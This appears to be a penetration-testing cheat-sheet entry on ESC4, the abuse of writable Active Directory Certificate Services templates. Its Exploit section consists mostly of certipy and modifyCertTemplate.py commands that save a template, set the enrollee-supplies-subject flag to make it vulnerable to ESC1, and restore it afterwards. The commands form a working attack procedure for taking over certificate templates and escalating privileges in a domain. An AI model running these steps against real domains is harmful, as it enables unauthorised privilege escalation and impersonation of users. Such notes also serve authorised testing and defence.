# ESC4 -Dangerous permissions
An user has dangerous permissions on a certificate template.  It is then possible to make this template vulnerable to ESC1.

 [https://www.thehacker.recipes/ad/movement/ad-cs/access-controls](https://www.thehacker.recipes/ad/movement/ad-cs/access-controls) 

###Exploit
-------

Save the old configuration, edit the template and make it vulnerable (ESC1)

```text-plain
certipy template -u [USER] -p [PASSWORD] -dc-ip [DC_IP] -template [templateName] -save-old
```

```text-plain
modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag
```

Exploit ESC1 on the modified ESC4 template (custom SAN)

```text-plain
see ESC1 exploit
```

After the attack, restore the original configuration

```text-plain
certipy template -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -template [templateName] -configuration [templateName.json]
```

```text-plain
modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag
```

###PS
--

It seems to set the “mspki-certificate-name-flag” flag to 1 which means “This flag instructs the client to supply subject information in the certificate request.”
